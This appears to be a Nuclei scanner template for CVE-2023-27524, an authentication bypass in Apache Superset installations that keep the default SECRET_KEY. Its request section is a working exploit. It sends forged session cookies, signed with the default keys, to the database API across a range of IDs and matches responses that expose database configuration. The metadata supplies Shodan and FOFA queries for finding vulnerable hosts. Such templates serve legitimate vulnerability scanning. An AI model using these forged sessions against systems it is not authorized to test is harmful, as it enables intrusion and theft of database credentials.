http:
- attack: clusterbomb
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - '"database_name":'
    - '"configuration_method":'
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    path:
    - '1'
    - '2'
    - '3'
    - '4'
    - '5'
    - '6'
    - '7'
    - '9'
    - '10'
    session:
    - eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZKFnng.XPeCvkBiP7rOv1PhgKZ8xkzi2jk
    - eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZKFu3g.k_WNoBY1ouhQyOXa5UcYdjVVuq0
    - eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZKG_fg.KalpJbMq1SZPCBuunG9-ycDX9HM
    - eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZKG_zQ.FPiBfT39gn2slf--XZHsk0rByEY
    - eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZKHAPQ.zRjwotMHJES3eW8fJH8F_5GlD-U
  raw:
  - 'GET /api/v1/database/{{path}} HTTP/1.1

    Host: {{Hostname}}

    Cookie: session={{session}}

    '
  stop-at-first-match: true
id: CVE-2023-27524
info:
  author: DhiyaneshDK,_0xf4n9x_
  classification:
    cpe: cpe:2.3:a:apache:superset:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-27524
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-1188
    epss-percentile: 0.99266
    epss-score: 0.84085
  description: Session Validation attacks in Apache Superset versions up to and including
    2.0.1. Installations that have not altered the default configured SECRET_KEY according
    to installation instructions allow for an attacker to authenticate and access
    unauthorized resources. This does not affect Superset administrators who have
    changed the default value for SECRET_KEY config.
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    bypass authentication and gain unauthorized access to sensitive information.

    '
  metadata:
    fofa-query:
    - body="apache superset"
    - icon_hash=1582430156
    max-request: 45
    product: superset
    shodan-query:
    - html:"Apache Superset"
    - http.favicon.hash:1582430156
    - http.html:"apache superset"
    vendor: apache
    verified: true
  name: Apache Superset - Authentication Bypass
  reference:
  - https://github.com/horizon3ai/CVE-2023-27524
  - https://www.horizon3.ai/cve-2023-27524-insecure-default-configuration-in-apache-superset-leads-to-remote-code-execution/
  - https://nvd.nist.gov/vuln/detail/CVE-2023-27524
  - http://packetstormsecurity.com/files/172522/Apache-Superset-2.0.0-Authentication-Bypass.html
  - http://www.openwall.com/lists/oss-security/2023/04/24/2
  remediation: 'Apply the latest security patches or upgrade to a patched version
    of Apache Superset.

    '
  severity: critical
  tags: packetstorm,cve,cve2023,apache,superset,auth-bypass,kev,vkev,vuln
